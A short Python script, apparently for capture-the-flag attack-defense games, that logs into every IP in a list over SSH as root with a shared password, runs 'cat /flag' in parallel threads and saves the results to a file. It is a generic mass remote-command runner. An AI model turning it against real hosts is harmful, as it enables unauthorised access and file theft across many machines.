from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import paramiko
from rich import print as rich_print


class SSHConnectionTester:
    def __init__(self):
        self.ips_file = 'ips.txt'
        self.output_file = 'flags.txt'
        self.max_threads = 20  # 可以根据实际情况调整线程池的大小

    def execute_command(self, ip, port, command, username, password):
        client = paramiko.SSHClient()
        try:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=1)
            stdin, stdout, stderr = client.exec_command(command)
            result = stdout.read().decode('utf-8').replace('\n', '')
            error = stderr.read().decode('utf-8').replace('\n', '')
            if error:
                rich_print(f"[bold red][-][ssh][{datetime.now()}]{ip}:{port} Error: {error}")
            else:
                rich_print(f"[bold green][+][ssh][{datetime.now()}]{ip}:{port} Response: {result}")
            return ip, result
        except Exception as e:
            rich_print(f"[bold yellow][!][ssh][{datetime.now()}]{ip}:{port} Connection failed: {e}")
            return ip, None
        finally:
            client.close()

    def test_all_ips(self, port=22, command='cat /flag', username="root", password=None):
        results = []
        with open(self.ips_file, 'r') as file:
            ips = [ip.strip() for ip in file.readlines()]

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.execute_command, ip, port, command, username, password) for ip in ips]
            for future in futures:
                results.append(future.result())

        with open(self.output_file, 'a') as file:
            for ip, result in results:
                if result:
                    file.write(f"[ssh][{datetime.now()}] {ip}:{port} {result}")
